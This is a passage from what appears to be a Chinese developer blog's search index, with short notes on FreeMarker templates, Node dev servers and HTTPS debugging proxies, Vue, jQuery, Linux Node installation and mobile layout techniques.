    <content type="text"><![CDATA[假设后端往ftl模板中注入了下列值1234567891011121314151617181920212223testA: '1111'testB: &#123; bDataOne: 'b1', bDateTwo: 'b2'&#125;testC: [ &#123; cDateOne: 'c11' cDateTwo: 'c12' &#125;, &#123; cDateOne: 'c21' cDateTwo: 'c22' &#125;]testD: falsetestE: &#123; eData: false&#125; 在ftl中页面中我们可以这样获取：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&quot;$&#123;testA&#125;&quot; // 直接获取&quot;$&#123;testA!&#125;&quot; // 获取，取不到时为空串，空序列或空哈希表（arr or object）&quot;$&#123;testA!&apos;&apos;&#125;&quot; // 获取，取不到时为空字符串&quot;$&#123;testA!&apos;test&apos;&#125;&quot; // 获取，取不到位test字符串&quot;$&#123;testD.eData!false&#125;&quot; // 获取testD里面的eData，取不到为false;取到testD，取不到eData，为false;取不到testD会出问题&quot;$&#123;(testD.eData)!false&#125;&quot; // 获取testD里面的eData，取不到testD或testD.eData，均为false$&#123;(testA!false)?string&#125; // 获取布尔值// 判断testA存在时&lt;#if testA&gt; ***&lt;/#if&gt;// 判断testA存在时&lt;#if testA??&gt; ***&lt;/#if&gt;// 判断testA存在时&lt;#if testA?has_content&gt; ***&lt;/#if&gt;// 判断testA为&apos;1111&apos;时&lt;#if testA === &apos;1111&apos;&gt; ***&lt;/#if&gt;// 判断testD为false存在时，如果取不到就用false&lt;#if testD!false&gt; ***&lt;/#if&gt;// 判断testB及testB.bDataOne存在时&lt;#if testB?? &amp;&amp; testB.bDataOne??&gt; ***&lt;/#if&gt;// 渲染列表testC&lt;#list testC as c&gt; &lt;p&gt;&lt;span&gt;$&#123;c.cDateOne!&#125;&lt;/span&gt;和&lt;span&gt;$&#123;c.cDateTwo!&#125;&lt;/span&gt;&lt;/p&gt;&lt;/#list&gt;// data属性存储testD&lt;p data-isShow=&quot;$&#123;(testD!false)?string(&apos;yes&apos;, &apos;no&apos;)&#125;&quot;&gt; // testD为true时，属性记录为yes，为false时或取不到时为false// data属性存储testE.eData&lt;p data-isShow=&quot;$&#123;((testE.eData)!false)?string(&apos;yes&apos;, &apos;no&apos;)&#125;&quot;&gt; // testD为true时，属性记录为yes，为false时或取不到时为false...]]></content>
      <tags>
        <tag>FreeMarker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[freemarker继承]]></title>
    <url>%2Fblog%2Ffreemarker%2Ffreemarker%E7%BB%A7%E6%89%BF.html</url>
    <content type="text"><![CDATA[freemarker有很好的继承机制，大体用法如下： 12345678||__layout.ftl | |__changeClazz.ftl | |__module.ftl | |__center.ftl 父级文件 layout.ftl123456789101112&lt;#marko page pageName="index" clazzName="t-center-bg1"&gt; &lt;!-- 此处暴露pageName和clazzName，可在子级中设置 --&gt; &lt;div class="$&#123;clazzName!''&#125;" data-page="$&#123;pageName!''&#125;"&gt; &lt;div class="header"&gt;&lt;/div&gt; &lt;#nested /&gt; # 此处暴露接口 &lt;div class="footer"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/#macro&gt; 子级文件 无孙子文件changeClazz.ftl 1234567891011&lt;#import "./layout.ftl" as temp /&gt;&lt;!-- import 父文件layout.ftl --&gt;@temp.page pageName='changeClazz' clazzName='t-center-bg2'&gt;&lt;!-- 设置layout的pageName 和 clazzName --&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="center"&gt;&lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt;&lt;/@temp.page&gt; 有孙子文件module.ftl 1234567891011121314151617181920212223&lt;#import "./layout.ftl" as temp /&gt;&lt;!-- import 父文件 --&gt;&lt;#marko center currentPage="index"&gt;&lt;!-- 此处暴露currentPage，可在子级中设置 --&gt; @temp.page pageName='center' clazzName='t-center-bg3'&gt; &lt;!-- 设置layout的pageName 和 clazzName --&gt; &lt;div class="left"&gt;&lt;/div&gt; &lt;div class="center" data-currentpage="$&#123;currentPage!''&#125;"&gt; &lt;div class="top"&gt;&lt;/div&gt; &lt;#nested /&gt; # 此处暴露接口 &lt;div class="bototm"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="right"&gt;&lt;/div&gt; &lt;/@temp.page&gt;&lt;/#macro&gt; 孙子文件center.ftl123456789&lt;#import "module.ftl" as module&gt;&lt;!-- import 父文件module.ftl --&gt;@module.center currentPage='1'&gt;&lt;!-- 设置module的currentPage --&gt; &lt;div class="main"&gt;&lt;/div&gt;&lt;/@module.page&gt;]]></content>
      <tags>
        <tag>FreeMarker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node安装的小型服务器]]></title>
    <url>%2Fblog%2Fnode%2Fnode%E5%B0%8F%E5%9E%8B%E6%9C%8D%E5%8A%A1%E5%99%A8.html</url>
    <content type="text"><![CDATA[node可以安装一些小型的服务器，如browser-sync、live-server、npx、Python服务器、anyproxy、spy-debugger browser-sync 详见BrowserSync 安装 123npm install -g browser-sync # 全局安装npm install --save-dev browser-sync # 局部安装 使用 12345browser-sync start --server --files "css/*.css" # 执行具体目录browser-sync start --server --files "css/*.css, *.html" # 监听多个类型的文件，逗号分开browser-sync start --server --files "**" # 自动运行 live-server 详见live-server 安装 123npm install -g live-server # 全局安装npm install --save-dev live-server # 局部安装 使用 12345live-serverlive-server --port=8080 # 指定端口live-server --browser=chrome # 指定浏览器访问 其他用法在package.json的scripts下配置 123"scripts": &#123; "server": "live-server ./ --port=8081" &#125; 运行 1npm run server npx 如果你把NPM升级到最新版本npm@5.2.0，可能会发现，它会安装一个新的包npx。 开启静态服务器 1npx http-server Python服务器 安装了 Python 的机器上，可以使用 nohup python -m SimpleHTTPServer [port] &amp; 快速搭建一个http服务。 使用123python -m SimpleHTTPServer 8000 # 只能前台运行python -m SimpleHTTPServer 8000 &amp; # 可后台运行，不影响终端的使用 anyproxy 详见anyproxy 安装 123npm install -g anyproxy # 全局安装npm install --save-dev anyproxy # 局部安装 使用 12345671、anyproxy2、电脑打开相应地址3、手机设置代理，默认端口98884、手机浏览器方位调试 更改端口 1anyproxy --port 1080 # 更改端口 代理HTTPS AnyProxy默认不对https请求做处理，如需看到明文信息，需要配置CA证书 解析https请求的原理是中间人攻击（man-in-the-middle），用户必须信任AnyProxy生成的CA证书，才能进行后续流程 生成证书并解析所有https请求 12anyproxy-ca #生成rootCA证书，生成后需要手动信任anyproxy --intercept #启动AnyProxy，并解析所有https请求 - [附录：如何信任CA证书](http://anyproxy.io/cn/#%E8%AF%81%E4%B9%A6%E9%85%8D%E7%BD%AE) spy-debugger 详见spy-debugger 集成了anyproxy，可进行微信调试，各种WebView样式调试、手机浏览器的页面真机调试。便捷的远程调试手机页面、抓包工具，支持：HTTP/HTTPS，无需USB连接设备。 安装 123npm install -g spy-debugger # 全局安装npm install --save-dev spy-debugger # 局部安装 使用 1234567891、spy-debugger2、电脑打开相应地址3、手机设置代理，默认端口98884、手机安装证书，手机浏览器访问http://s.xxx5、手机浏览器方位调试 配置1234567891011spy-debugger -p 8888 # 更改端口spy-debugger -e http://127.0.0.1:8888 # 设置外部代理spy-debugger -c true # 是否允许HTTP缓存，默认falsespy-debugger -b false # 是否只拦截浏览器发起的https请求，默认truespy-debugger -w true # 设置页面内容为可编辑模式，默认falsespy-debugger -i true # 是否允许weinre监控iframe加载的页面]]></content>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdown文件夹说明]]></title>
    <url>%2Fblog%2Fother%2Fmarkdown%E6%96%87%E4%BB%B6%E5%A4%B9%E8%AF%B4%E6%98%8E.html</url>
    <content type="text"><![CDATA[123456789101112131415161718├── base // 定义游戏开发基础类│ ├── animatoin.js // 帧动画的简易实现│ ├── pool.js // 对象池的简易实现│ └── sprite.js // 游戏基本元素精灵类├── libs│ ├── symbol.js // ES6 Symbol简易兼容│ └── weapp-adapter.js // 小游戏适配器├── npc│ └── enemy.js // 敌机类├── player│ ├── bullet.js // 子弹类│ └── index.js // 玩家类├── runtime│ ├── background.js // 背景类│ ├── gameinfo.js // 用于展示分数和结算界面│ └── music.js // 全局音效管理器├── databus.js // 管控游戏状态└── main.js]]></content>
      <tags>
        <tag>Other</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo博客404页面支持https]]></title>
    <url>%2Fblog%2Fother%2Fhexo%E8%85%BE%E8%AE%AF%E5%85%AC%E7%9B%8A404%E6%94%AF%E6%8C%81https.html</url>
    <content type="text"><![CDATA[原始404页面资源：12345678&lt;link rel="stylesheet" type="text/css" href="https://qzone.qq.com/gy/404/style/404style.css"&gt;&lt;script type="text/plain" src="http://www.qq.com/404/search_children.js" charset="utf-8" homePageUrl="/" homePageName="回到我的主页"&gt;&lt;/script&gt;&lt;script src="https://qzone.qq.com/gy/404/data.js" charset="utf-8"&gt;&lt;/script&gt;&lt;script src="https://qzone.qq.com/gy/404/page.js" charset="utf-8"&gt;&lt;/script&gt; 将对应的资源替换成：12345678&lt;link rel="stylesheet" type="text/css" href="//qzonestyle.gtimg.cn/qzone/hybrid/app/404/style/404style_min.css"&gt;&lt;script type="text/plain" src="//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js" charset="utf-8" homePageUrl="/" homePageName="回到我的主页"&gt;&lt;/script&gt;&lt;script src="//qzonestyle.gtimg.cn/qzone/v6/portal/gy/404/data.js" charset="utf-8"&gt;&lt;/script&gt;&lt;script src="//qzonestyle.gtimg.cn/qzone/v6/portal/gy/404/page.js" charset="utf-8"&gt;&lt;/script&gt; 也可以直接复制404页面给外部使用]]></content>
      <tags>
        <tag>Other</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在js文件中调用一个vue组件]]></title>
    <url>%2Fblog%2Fvue%2F%E5%9C%A8js%E9%87%8C%E9%9D%A2%E8%B0%83%E7%94%A8%E4%B8%80%E4%B8%AAvue%E7%BB%84%E4%BB%B6.html</url>
    <content type="text"><![CDATA[通常情况下我们都是在一个父组件中调用一个子组件，有时我们可能需要在一个js文件内来调用子组件，如在全局的index.js中设置请求拦截器时调用一个message弹窗子组件，用来显示报错信息 component中有一个message子组件：123456789101112// htmldiv.message-mask(v-if="alertMsg.isShowMessage") div p &#123;&#123;alertMsg.errInfo&#125;&#125; button(@click="close") 关闭// scriptmethods: &#123; close () &#123; this.$emit('close'); &#125;&#125; 如果是在父组件中调用message组件，这样写：123456789101112131415161718// htmldiv message(:alert-msg="alertMessage", @close="closeEvent")// scriptdata () &#123; return &#123; alertMessage: &#123; isShowMessage: true, errInfo: '' &#125; &#125;&#125;，methods: &#123; closeEvent () &#123; this.alertMessage.isShowMessage = false; &#125;&#125; 如果是在其他js中调用，这样写： 在util文件中设置一个alert.js文件12345678910111213141516171819202122import Vue from 'vue';import alert from '../components/alert';let instance = null;const MessageConstructor = Vue.extend(alert);const Message = (config) =&gt; &#123; instance = new MessageConstructor(&#123; el: document.createElement('div') &#125;); document.body.appendChild(instance.$el); Vue.nextTick(()=&gt;&#123; instance.alertMsg = config; instance.$on('close', function () &#123; document.body.removeChild(this.$el); &#125;) &#125;);&#125;export default Message; 在全局的index.js文件中这样使用（Message处）：12345678910111213141516171819202122232425262728293031323334353637383940414243import Vue from 'vue';import axios from "axios";import Message from './util/alert';Vue.prototype.$ajax = axios;// axios相关配置axios.interceptors.request.use( function(config) &#123; config.data=qs.stringify(config.data); return config; &#125;, function(error) &#123; // Do something with request error return Promise.reject(error); &#125;);// Add a response interceptoraxios.interceptors.response.use( function(response) &#123; // Do something with response data if (response.data.success) &#123; return response.data; &#125; else &#123; //此处需要弹框组件 var isShowAlert = document.getElementsByClassName('message-mask').length != 0; if (!isShowAlert) &#123; // 此处设置检查弹窗，只出现一次，防止同步请求都请求失败时弹窗出现两次bug Message(&#123; isShowMessage: true, errInfo: response.data.errorInfo || '请求失败，稍后重试' &#125;); &#125; return Promise.reject(response.data.error); &#125; &#125;, function(error) &#123; // Do something with response error return Promise.reject(error); &#125;); 实际上我们在构建时就应当考虑这种写法的弊端，正确的做法应该是在顶层组件中挂载message组件，需要显示是通过$emit派发事件显示或关闭即可]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows系统端口占用解决办法]]></title>
    <url>%2Fblog%2Ftools%2Fwindows%E7%94%B5%E8%84%91%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html</url>
    <content type="text"><![CDATA[123456781、查看端口对应的PID（最后一项） netstat -ano |findstr &quot;8081&quot;2、查看PID对应的应用程序 tasklist |findstr &quot;PID&quot;3、杀掉该应用程序的进程 taskkill /f /t /im &quot;java.exe&quot; 注：必须使用window的 cmd 窗口来运行程序，某些应用的内置终端无法运行]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[a标签同时使用target_blank和javascrip_void后造成的IE跳转空包页的bug]]></title>
    <url>%2Fblog%2Fhtml%2Fa%E6%A0%87%E7%AD%BE%E5%90%8C%E6%97%B6%E4%BD%BF%E7%94%A8target_blank%E5%92%8Cjavascrip_void%E5%90%8E%E9%80%A0%E6%88%90%E7%9A%84IE%E8%B7%B3%E8%BD%AC%E7%A9%BA%E7%99%BD%E9%A1%B5%E7%9A%84bug.html</url>
    <content type="text"><![CDATA[在项目中有个位置的点击a标签这里要加一个权限判断，但是之前使用的是js动态添加a标签，href的属性值是一个url，但是我要做权限判断之后，我的url就不能设置在href属性中了，这样的话我可以在a标签里面新增一个属性来放置url的值，然后把href属性改为“javascript:void(0)”，这样使得点击的时候不会有任何操作，但是我改了之后还是会打开一个空白页面，后来找了一下发现是后面的target=“_blank”这个没有去掉，把这个去掉之后问题就解决了。 原文：http://www.cnblogs.com/wgl1995/p/6392991.html]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue中使用mint-ui移动端组件库]]></title>
    <url>%2Fblog%2Fvue%2Fvue%E4%B8%AD%E4%BD%BF%E7%94%A8mint-ui%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%BB%84%E4%BB%B6%E5%BA%93.html</url>
    <content type="text"><![CDATA[mint-ui官网mint-ui 1.0文档mint-ui 2.0文档 预览http://elemefe.github.io/mint-ui/#/ 安装12345# Vue 1.xnpm install mint-ui@1 -S# Vue 2.0npm install mint-ui -S 引入1234567891011// main.js引入全部组件import Vue from &apos;vue&apos;;import Mint from &apos;mint-ui&apos;;import &apos;mint-ui/lib/style.css&apos; Vue.use(Mint);// 按需引入部分组件import &#123; Toast, Indicator &#125; from &apos;minu-ui&apos;;import &apos;mint-ui/lib/style.css&apos; components: &#123;Toast, Indicator&#125; 部分用法 Toast 1234567891011121314151617Toast('我就是那个3s的toast') // 默认3sToast(&#123; message: '哈哈，我是5s的toast', position: 'bottom', duration: 5000 // -1表示一直开启&#125;)Toast(&#123; message: '操作成功', iconClass: 'icon icon-success' // 增加icon class类名&#125;)let instance = Toast('提示信息');setTimeout(() =&gt; &#123; instance.close(); // 手动关闭&#125;, 2000); Indicator加载 12345678Indicator.open('加载中...')Indicator.open(&#123; text: '加载中...', spinnerType: 'triple-bounce' // snake(默认)、fading-circle、double-bounce、triple-bounce&#125;)Indicator.close(); // 手动关闭 MessageBox 1234567891011121314151617181920212223242526272829303132MessageBox('提示', '操作成功')MessageBox(&#123; title: '提示', message: '操作成功', showCancelButton: true // 带取消按钮&#125;)MessageBox.alert('操作成功', '提示')MessageBox.alert('操作成功', '提示').then(action =&gt; &#123; // 点击按钮的回调&#125;);MessageBox.confirm('确定执行此操作', '提示')MessageBox.confirm('确定执行此操作', '提示').then(action =&gt; &#123; // 点击按钮的回调&#125;);MessageBox.prompt('请输入姓名', '提示');MessageBox.prompt('确定执行此操作', '提示').then((&#123;value, action&#125;) =&gt; &#123; // 点击按钮的回调 console.log(value)&#125;);// title: 标题// message: 提示框内容// showConfirmButton: 是否显示确认按钮，默认true// showCancelButton: 是否显示取消按钮，默认false// confirmButtonText、confirmButtonHighlight、confirmButtonClass: 确认按钮文本、加粗、类名// cancelButtonText、cancelButtonHighlight、cancelButtonClass: 取消按钮文本、加粗、类名// closeOnClickModal: 点击遮罩关闭提示框// showInput、inputType、inputValue、inputPlaceholder: 是否显示输入框、输入框类型、输入框的值、输入框的占位符 Action sheet操作表 1234567891011121314151617181920212223242526272829303132333435363738// template&lt;button @click="showActionSheet"&gt;点击上拉 action sheet&lt;/button&gt;&lt;mt-actionsheet :actions="actions" :cancelText="cancelText" :closeOnClickModal="true" v-model="sheetVisible"&gt;&lt;/mt-actionsheet&gt;// js:data () &#123; return &#123; actions: [ // 可选择的 &#123; name: '拍照', method: this.choiceCamera // 点击后回调 &#125;, &#123; name: '从相册中选择', method: this.choicePhoto &#125; ], sheetVisible: false, cancelText: '取消', // 取消按钮的文本 &#125;&#125;,methods: &#123; showActionSheet () &#123; this.sheetVisible = true &#125;, choiceCamera () &#123; console.log('选择了拍照') &#125;, choicePhoto () &#123; console.log('选择了从相册中选择') &#125;&#125; 更多用法请查看官方文档 mint-ui 1.0文档mint-ui 2.0文档]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端吸顶效果]]></title>
    <url>%2Fblog%2Fjavascript%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%B8%E9%A1%B6%E6%95%88%E6%9E%9C.html</url>
    <content type="text"><![CDATA[在开发移动端的时候，经常需要对tab做吸顶效果处理。 吐槽一下~ 有些程序员明知道增加吸顶效果对用户更加友好却嫌麻烦不加，非得产品经理提需求。 一个好的程序员应该再看见tab的时候就会想到这些，而不用等产品经理来提醒。开发产品的时候应该多站在用户的角度去思考问题，而不是首先考虑代码的实现。 好了，废话不多说，开始看代码: 12345678910111213&lt;div class="banner"&gt;&lt;/div&gt;&lt;div class="tab-content" id="tabContent"&gt; &lt;ul class="tab-box" id="tabBox"&gt; &lt;li&gt;精选&lt;/li&gt; &lt;li&gt;推荐&lt;/li&gt; &lt;li&gt;活动&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;div class="main"&gt; &lt;/div&gt; 12345678910111213141516var ua = window.navigator.userAgent.toLowerCase();var isIos = /iphone|ipod|ipad/ig.test(ua)if (isIos) &#123; // iOS使用 sticky属性 $('#tabContent').addClass('position-sticky'); // 操作外层&#125; else &#123; var tabOffsetTop = $('#tabBox').offset().top; // tab 距离头部的高度（定值） $(window).on('scroll', () =&gt; &#123; const scrollTop = $(window).scrollTop(); // 当前滚动条的高度（变值） if (scrollTop &gt;= tabOffsetTop) &#123; $('#tabBox').addClass('position-fix'); // 安卓操作内层div，外层div用于占位（此处占位的div很有必须） &#125; else &#123; $('#tabBox').removeClass('position-fix'); &#125; &#125;);&#125; 特别提示：安卓在滚动顶部的时候设置为fix定位，此时必须有个div占位，否则占位突然消失，可能会造成bug 完整代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="initial-scale=1, user-scalable=0, minimal-ui" charset="UTF-8"&gt; &lt;title&gt;移动端吸顶效果&lt;/title&gt; &lt;style&gt; * &#123; margin: 0; padding: 0; box-sizing: border-box; &#125; .banner&#123; height: 160px; background: #eee; margin-bottom: 20px; &#125; .tab-content&#123; width: 100%; background: #ddd; height: 50px; margin-bottom: 20px; &#125; .tab-box&#123; background: #ddd; width: 100%; overflow: hidden; height: 50px; line-height: 50px; &#125; .tab-box li &#123; display: inline-block; width: 33.33%; float: left; text-align: center; &#125; .main&#123; background: #eee; &#125; .main p &#123; line-height: 100px; &#125; .position-sticky&#123; position: -webkit-sticky; position: sticky; top: 0px; z-index: 1; &#125; .position-fix&#123; position: fixed; left: 0; top: 0px; z-index: 1; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="banner"&gt;&lt;/div&gt; &lt;div class="tab-content" id="tabContent"&gt; &lt;ul class="tab-box" id="tabBox"&gt; &lt;li&gt;精选&lt;/li&gt; &lt;li&gt;推荐&lt;/li&gt; &lt;li&gt;活动&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class="main"&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;p&gt;1sdsdsd&lt;/p&gt; &lt;/div&gt; &lt;script src="./js/jquery-2.1.4.js"&gt;&lt;/script&gt; &lt;script&gt; $(function () &#123; var ua = window.navigator.userAgent.toLowerCase(); var isIos = /iphone|ipod|ipad/ig.test(ua); if (isIos) &#123; // iOS使用 sticky属性 $('#tabContent').addClass('position-sticky'); &#125; else &#123; var tabOffsetTop = $('#tabBox').offset().top; // tab 距离头部的高度（定值） $(window).on('scroll', () =&gt; &#123; const scrollTop = $(window).scrollTop(); // 当前滚动条的高度（变值） if (scrollTop &gt;= tabOffsetTop) &#123; $('#tabBox').addClass('position-fix'); // 安卓操作内层div，外层div用于占位 &#125; else &#123; $('#tabBox').removeClass('position-fix'); &#125; &#125;); &#125; &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux安装node环境]]></title>
    <url>%2Fblog%2Flinux%2Flinux%E5%AE%89%E8%A3%85node%E7%8E%AF%E5%A2%83.html</url>
    <content type="text"><![CDATA[1 安装1wget https://nodejs.org/dist/v8.11.3/node-v8.11.3-linux-x64.tar.xz # 二进制地址（from node website） 2 解压123xz -d node-v8.11.3-linux-x64.tar.xztar -xvf node-v8.11.3-linux-x64.tar 3 重命名1mv node-v8.11.3-linux-x64 node 4 创建软链接1234567891011ln -s /usr/local/node/bin/node /usr/bin/nodenode --versionln -s /usr/local/node/bin/npm /usr/bin/npmnpm --versionln -s /usr/local/node/bin/npx /usr/bin/npxnpx --version]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js检测浏览器是否出于放缩状态]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E6%A3%80%E6%B5%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%90%A6%E5%87%BA%E4%BA%8E%E6%94%BE%E7%BC%A9%E7%8A%B6%E6%80%81.html</url>
    <content type="text"><![CDATA[先来说说浏览器提供的标准检测接口，window.devicePixelRatio 是设备上物理像素和设备独立像素的比例，该属性就可以用于检测网页是否被缩放了。在普通的 PC 浏览器上，在默认无缩放的情况下其默认值是 1。目前Firefox、chrome等都得到了很好的支持。 好吧，接下来该说说 IE 的处理方法了。IE 提供了 window.screen.deviceXDPI 和 window.screen.logicalXDPI 两个属性，deviceXDPI 就是对应的设备上的物理像素，而 logicalXDPI 就是对应了设备独立像素的比例。估计标准的检测接口也只是基于 IE 这种方法的一种改进。这两个属性在 windows XP+ 以上的系统上的默认值都是 96，因为系统默认的就是 96dpi 。 对于以上两种都不支持的浏览器，还可以利用window.outerWidth 和 window.innerWidth 这两个属性。outerWidth 返回的是窗口元素的外部实际宽度，innerWidth 返回的是窗口元素的内部实际宽度，这两个宽度都包含了滚动条在内的宽度。 123456789101112131415161718192021function detectZoom ()&#123; var ratio = 0, screen = window.screen, ua = navigator.userAgent.toLowerCase(); if (window.devicePixelRatio !== undefined) &#123; ratio = window.devicePixelRatio; &#125; else if (~ua.indexOf('msie')) &#123; if (screen.deviceXDPI &amp;&amp; screen.logicalXDPI) &#123; ratio = screen.deviceXDPI / screen.logicalXDPI; &#125; &#125; else if (window.outerWidth !== undefined &amp;&amp; window.innerWidth !== undefined) &#123; ratio = window.outerWidth / window.innerWidth; &#125; if (ratio)&#123; ratio = Math.round(ratio * 100); &#125; return ratio;&#125;; detectZoom 函数的返回值如果是 100 就是默认缩放级别，大于 100 则是放大了，小于 100 则是缩小了。]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery上传文件]]></title>
    <url>%2Fblog%2Fjquery%2F%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6.html</url>
    <content type="text"><![CDATA[12345678&lt;input type="text" onfocus="this.blur()" id="choiceInput" placeholder="请选择需要上传的文件"&gt;&lt;!-- 上传excel --&gt;&lt;input type="file" accept=".xls, .xlsx" id="hiddenInput" style="display: none;"&gt;&lt;!-- 上传图片 --&gt;&lt;input type="file" accept="image/gif,image/jpeg,image/jpg,image/png,image/svg" id="hiddenInput" style="display: none;"&gt;&lt;button id="uploadBtn"&gt;上传&lt;/button&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758$('#choiceInput').on('click', function () &#123; $('#hiddenInput').click(); // 触发隐藏的file input&#125;);$('#hiddenInput').on('change', function () &#123; $('#choiceInput').val($(this)[0].files[0].name); // 显示上传文件的名称 // 如果没有上传按钮，则在此处开始上传&#125;);var uploadFlag = false; // 上传flag，防止多次点击$('#uploadBtn').on('click', function () &#123; if (uploadFlag) return; uploadFlag = true; var fileName = $('#choiceInput').val(); var file = $('#hiddenInput')[0].files[0]; if (fileName == "")&#123; alert("您还没有选择excel文档"); return ; &#125; // 判断上传的文件类型（判断excel） if (fileName.substring(fileName.length - 4) != ".xls" &amp;&amp; fileName.substring(fileName.length - 5) != ".xlsx") &#123; alert("仅支持上传excel文档"); return ; &#125; // 判断上传的文件类型（判断图片） if(!/image\/\w+/.test(file.type))&#123; alert("仅支持上传图片"); return ; &#125; var formData = new FormData(); // 注意formData存在兼容性，IE10开始支持 formData.append("adId", '10001'); formData.append("type", '1'); formData.append("file", file); $.ajax(&#123; url: "saveidbyfile.vpage", type: "POST", data: formData, processData: false, contentType: false, async: true, timeout: 10 * 1000, success: function (data) &#123; uploadFlag = false; if (data.success) &#123; alert('上传成功') &#125; else &#123; alert('上传失败：' + data.info); &#125; &#125;, error: function () &#123; uploadFlag = false; &#125; &#125;);&#125;);]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试官提问]]></title>
    <url>%2Fblog%2Fother%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E5%AE%98%E6%8F%90%E9%97%AE.html</url>
    <content type="text"><![CDATA[请输入密码：提交 移动端meta12345&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0,user-scalable=no&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=0.5, minimum-scale=0.5,maximum-scale=0.5,user-scalable=no&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=0.3333333333333333, minimum-scale=0.3333333333333333,maximum-scale=0.3333333333333333,user-scalable=no&quot;&gt; 在移动端开发时，我们会发现手机的dpr可能都不一致，有些是1，chrome预览器就是1，有些手机是2，有些手机是3，这和手机的retina屏有关，所以我们不能单纯将scale值写死，应该根据dpr的值来设置，即用1.0 / dpr的值。 123456789// 设置viewport属性，安卓4.5以下均设置为1.0，其余通过计算取得var ua = window.navigator.userAgent.toLowerCase();var dpr = window.devicePixelRatio;var scaleValue = 1.0 / dpr;var metaEl = document.createElement(&apos;meta&apos;);metaEl.setAttribute(&apos;name&apos;, &apos;viewport&apos;);if (ua.substr(ua.indexOf(&apos;android&apos;) + 8, 3) &lt; 4.5) metaEl.setAttribute(&apos;content&apos;, &apos;initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no&apos;);else metaEl.setAttribute(&apos;content&apos;, &apos;initial-scale=&apos; + scaleValue + &apos;, maximum-scale=&apos; + scaleValue + &apos;, minimum-scale=&apos; + scaleValue + &apos;, user-scalable=no&apos;);document.getElementsByTagName(&apos;head&apos;)[0].appendChild(metaEl); rem单位使用 head区脚本（最重要） 12345678910&lt;script&gt; var html = window.document.documentElement; var sw = html.clientWidth; var sh = html.clientHeight; var rfs = sw * (32 / 640) + 'px'; html.dataset.sw = sw; html.dataset.sh = sh; html.style.fontSize = rfs;&lt;/script&gt; 应用 在css中设置font-size: 设计稿标注字号 / 32 + rem;font-size: 设计稿标注字号 / (设计稿宽 * 0.05) + rem; 在scss中设置 1234@function r($px) &#123; @return $px / 32 + rem; // 32是针对640的设计稿 @return $px / (设计稿宽 * 0.05) + rem; // 其他&#125; 12345div&#123; font-size: r(30); width: r(200); height: r(60);&#125; 移动端单位使用详见 数组去重方法 原数组 1var myArray = [0, 1, 6, 9, 0, 2, 4, 5, 4]; 方法1 12345678910111213function aaa()&#123; var newArray = []; //一个新的临时数组 for(var i = 0; i &lt; myArray.length; i++)&#123; //遍历当前数组 //如果当前数组的第i项已经保存进了临时数组，那么跳过， //否则把当前项push到临时数组里面 if (newArray.indexOf(myArray[i]) == -1)&#123; //在新数组中查找原数组的每一项是否存在 newArray.push(myArray[i]); //如果不存在就加到新数组中 &#125; &#125; // return newArray; alert("新的数组：" + newArray);&#125;aaa(); 方法2 123456789101112function bbb()&#123; var n = &#123;&#125;,r=[]; //n为hash表，r为临时数组 